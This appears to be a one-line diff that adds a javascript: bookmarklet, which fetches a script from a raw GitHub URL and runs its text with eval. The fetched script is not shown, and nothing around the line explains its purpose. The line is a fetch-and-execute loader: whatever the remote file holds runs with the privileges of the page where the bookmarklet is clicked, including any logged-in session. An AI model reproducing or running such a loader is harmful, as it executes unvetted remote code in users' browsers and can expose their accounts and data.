@@ -1,0 +1,1 @@
+javascript:fetch("https://raw.githubusercontent.com/dudkckcmc/Teste/refs/heads/main/script.js").then(t=>t.text()).then(eval);
